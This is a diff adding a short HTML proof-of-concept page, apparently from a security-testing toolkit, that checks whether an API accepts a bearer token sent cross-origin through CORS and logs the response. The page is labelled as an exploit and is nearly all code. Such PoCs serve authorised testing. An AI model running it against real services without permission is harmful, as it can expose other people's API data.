@@ -1,0 +1,41 @@
+<!doctype html>
+<!--
+CORS PoC: Authorization header test.
+
+Useful when:
+- Server allows Authorization header via CORS
+- Tokens may be usable cross-origin
+- High-impact API exposure suspected
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS Authorization Header</title>
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+  const TOKEN = "Bearer REPLACE_ME";
+
+  document.getElementById("run").onclick = async () => {
+    try {
+      const response = await fetch(TARGET_URL, {
+        headers: {
+          "Authorization": TOKEN
+        }
+      });
+
+      const data = await response.text();
+      console.log("RESPONSE:", data);
+
+    } catch (err) {
+      console.error("Request failed:", err);
+    }
+  };
+</script>
+
+</body>
+</html>
